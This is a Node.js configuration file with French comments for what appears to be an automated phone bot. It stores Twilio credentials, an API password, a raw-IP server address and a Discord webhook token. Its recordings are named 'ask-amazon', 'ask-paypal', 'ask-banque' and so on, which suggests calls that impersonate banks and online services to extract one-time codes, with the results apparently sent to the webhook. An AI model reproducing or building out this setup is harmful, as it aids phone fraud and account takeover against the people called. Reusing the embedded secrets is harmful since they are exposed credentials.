module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'ACb82ca814dfc78b76399ff71ace016c76',
    authToken: '155f5b4c12f4c339b8f699d18a50d575',
    callerid: '+18336589305',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'P48l0-r43l35707pbot!',
    serverurl: 'http://216.250.113.11:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/1194586922237050910/ToU7U7nAxGWUlXNbqmxSxkNuLRyz8jAAnja3b03N5TApykZQxd_5Y82Y1f6VTtJ4CvE-',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
